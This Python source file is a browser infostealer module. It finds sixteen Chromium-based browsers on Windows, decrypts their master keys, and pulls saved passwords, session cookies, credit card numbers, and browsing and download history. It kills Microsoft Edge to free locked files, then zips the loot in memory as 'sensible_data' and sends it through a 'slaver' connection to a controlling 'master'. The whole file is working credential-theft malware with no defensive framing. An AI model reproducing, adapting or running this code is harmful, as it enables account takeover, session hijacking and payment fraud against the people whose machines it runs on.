import io
import os
import json
import base64
import sqlite3
import subprocess
import time
import zipfile
import shutil
from datetime import datetime
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES

in_memory_db = ':memory:'

class BrowserDataExtractor:
    def __init__(self):
        # Define paths to various browsers' user data directories
        self.appdata = os.getenv('LOCALAPPDATA')
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
        }

    @staticmethod
    def get_master_key(path: str):
        """
        Retrieve and decrypt the master key used for password decryption.

        Args:
            path (str): Path to the browser's user data directory.

        Returns:
            bytes: Decrypted master key.
        """
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
            return

        with open(path + "\\Local State", "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    @staticmethod
    def decrypt_password(buff: bytes, master_key: bytes) -> str:
        """
        Decrypt a password using the master key.

        Args:
            buff (bytes): Encrypted password.
            master_key (bytes): Decrypted master key.

        Returns:
            str: Decrypted password.
        """
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_login_data(self, path: str, profile: str, master_key):
        """
        Retrieve login data (saved passwords) from the browser.

        Args:
            path (str): Path to the browser's user data directory.
            profile (str): Profile name.
            master_key: Master key for password decryption.

        Returns:
            str: Login data as a formatted string.
        """
        login_db = os.path.join(path, profile, 'Login Data')
        if not os.path.exists(login_db):
            return

        result = ""
        conn = sqlite3.connect(in_memory_db)  # Create an in-memory database
        cursor = conn.cursor()

        try:
            cursor.execute('ATTACH DATABASE ? AS login_db', (login_db,))
            cursor.execute('SELECT action_url, username_value, password_value FROM login_db.logins')

            for row in cursor.fetchall():
                password = self.decrypt_password(row[2], master_key)
                result += f"""
                URL: {row[0]}
                Email: {row[1]}
                Password: {password}

                """
        except sqlite3.Error as e:
            print(f"Error retrieving login data: {e}")

        conn.close()
        return result

    def get_credit_cards(self, path: str, profile: str, master_key):
        cards_db = os.path.join(path, profile, 'Web Data')
        if not os.path.exists(cards_db):
            return

        result = ""
        conn = sqlite3.connect(in_memory_db)  # Create an in-memory database
        cursor = conn.cursor()

        try:
            cursor.execute('ATTACH DATABASE ? AS cards_db', (cards_db,))
            cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM cards_db.credit_cards')

            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue

                card_number = self.decrypt_password(row[3], master_key)
                result += f"""
                Name On Card: {row[0]}
                Card Number: {card_number}
                Expires On:  {row[1]} / {row[2]}
                Added On: {datetime.fromtimestamp(row[4])}

                """
        except sqlite3.Error as e:
            print(f"Error retrieving credit card data: {e}")

        conn.close()
        return result


    def get_cookies(self, path: str, profile: str, master_key):
        """
        Retrieve cookies from the browser.

        Args:
            path (str): Path to the browser's user data directory.
            profile (str): Profile name.
            master_key: Master key for cookie decryption.

        Returns:
            str: Cookie data as a formatted string.
        """
        cookie_db = os.path.join(path, profile, 'Network', 'Cookies')
        if not os.path.exists(cookie_db):
            return

        result = ""
        conn = sqlite3.connect(in_memory_db)  # Create an in-memory database
        cursor = conn.cursor()

        try:
            cursor.execute('ATTACH DATABASE ? AS cookies_db', (cookie_db,))
            cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies_db.cookies')

            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue

                cookie = self.decrypt_password(row[3], master_key)

                result += f"""
                Host Key : {row[0]}
                Cookie Name : {row[1]}
                Path: {row[2]}
                Cookie: {cookie}
                Expires On: {row[4]}

                """
        except sqlite3.Error as e:
            print(f"Error retrieving cookie data: {e}")

        conn.close()
        return result

    def get_web_history(self, path: str, profile: str):
        """
        Retrieve web browsing history from the browser.

        Args:
            path (str): Path to the browser's user data directory.
            profile (str): Profile name.

        Returns:
            str: Browsing history data as a formatted string.
        """
        web_history_db = os.path.join(path, profile, 'History')
        result = ""
        if not os.path.exists(web_history_db):
            return

        conn = sqlite3.connect(in_memory_db)  # Create an in-memory database
        cursor = conn.cursor()

        try:
            cursor.execute('ATTACH DATABASE ? AS web_history_db', (web_history_db,))
            cursor.execute('SELECT url, title, last_visit_time FROM web_history_db.urls')

            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue
                result += f"""
                URL: {row[0]}
                Title: {row[1]}
                Visited Time: {row[2]}

                """
        except sqlite3.Error as e:
            print(f"Error retrieving web history data: {e}")

        conn.close()
        return result

    def get_downloads(self, path: str, profile: str):
        """
        Retrieve download history from the browser.

        Args:
            path (str): Path to the browser's user data directory.
            profile (str): Profile name.

        Returns:
            str: Download history data as a formatted string.
        """
        downloads_db = os.path.join(path, profile, 'History')
        result = ""
        if not os.path.exists(downloads_db):
            return

        conn = sqlite3.connect(in_memory_db)  # Create an in-memory database
        cursor = conn.cursor()

        try:
            cursor.execute('ATTACH DATABASE ? AS downloads_db', (downloads_db,))
            cursor.execute('SELECT tab_url, target_path FROM downloads_db.downloads')

            for row in cursor.fetchall():
                if not row[0] or not row[1]:
                    continue
                result += f"""
                Download URL: {row[0]}
                Local Path: {row[1]}

                """

        except sqlite3.Error as e:
            print(f"Error retrieving download history data: {e}")

        conn.close()
        return result

    def installed_browsers(self):
        """
        Check and return a list of installed browsers.

        Returns:
            list: List of installed browser names.
        """
        results = []
        for browser, path in self.browsers.items():
            if os.path.exists(path):
                results.append(browser)
        return results

    @staticmethod
    def save_results(browser_name, data_type, content):
        """
        Save extracted data to memory.

        Args:
            browser_name (str): Name of the browser.
            data_type (str): Type of data being saved.
            content (str): Data content.

        Returns:
            tuple: Filename, file bytes, and directory path.
        """
        dir_path = os.path.join(browser_name)

        if content is not None:
            # Create a file-like object in memory
            file_obj = io.StringIO()
            file_obj.write(content)

            # Get the bytes of the content
            file_bytes = file_obj.getvalue().encode('utf-8')

            filename = f"{data_type}.txt"

            print(f"\t [*] Saved {data_type} in memory")

            return filename, file_bytes, dir_path
        else:
            print("\t [-] No Data Found!")
            return None, None, None

    @staticmethod
    def terminate_edge():
        """
        Terminate Microsoft Edge browser.
        """
        # Use subprocess to run a command that terminates Microsoft Edge
        try:
            subprocess.run(["taskkill", "/f", "/im", "msedge.exe"], check=True, startupinfo=subprocess.STARTUPINFO())
        except subprocess.CalledProcessError as e:
            print(f"Error terminating Microsoft Edge: {e}")

    @staticmethod
    def handle_browser_data(browser, data_type, data_function, files):
        separator = "\t------\n"
        try:
            print(f"\t [!] Getting {data_type} for {browser}")
            file_bytes = data_function  # Directly get data without copying to a file
            if file_bytes is not None:
                files.append({"filename": f"{browser}_{data_type}.txt", "bytes": file_bytes})
        except Exception as e:
            print(f"\t [!] Error getting {data_type} for {browser}: {e}")
        print(separator)

    @staticmethod
    def create_and_send_zip(slaver, address, files):
        # Create a zip file in memory
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "a", zipfile.ZIP_DEFLATED, False) as zip_file:
            for file in files:
                zip_file.writestr(file["filename"], file["bytes"])

        zip_buffer.seek(0)
        zip_bytes = zip_buffer.read()

        # Get the current timestamp
        current_time = time.localtime()
        timestamp = time.strftime("%d-%m-%y_%H-%M", current_time)
        slaver.send_file_to_master(address, f"sensible_data_{timestamp}.zip", zip_bytes)

    def dump_sensible_data(self, slaver, address):
        available_browsers = self.installed_browsers()
        files = []

        for browser in available_browsers:
            browser_path = self.browsers[browser]
            master_key = self.get_master_key(browser_path)
            print(f"Getting Stored Details from {browser}")

            if browser == "microsoft-edge":
                self.terminate_edge()

            self.handle_browser_data(browser, 'Saved_Passwords',
                                     self.get_login_data(browser_path, "Default", master_key),
                                     files)
            self.handle_browser_data(browser, 'Browser_History', self.get_web_history(browser_path,
                                                                                      "Default"),
                                     files)
            self.handle_browser_data(browser, 'Download_History', self.get_downloads(browser_path,
                                                                                     "Default"),
                                     files)
            self.handle_browser_data(browser, 'Browser_Cookies', self.get_cookies(browser_path,
                                                                                  "Default", master_key),
                                     files)
            self.handle_browser_data(browser, 'Saved_Credit_Cards', self.get_credit_cards(browser_path,
                                                                                          "Default", master_key),
                                     files)

        self.create_and_send_zip(slaver, address, files)
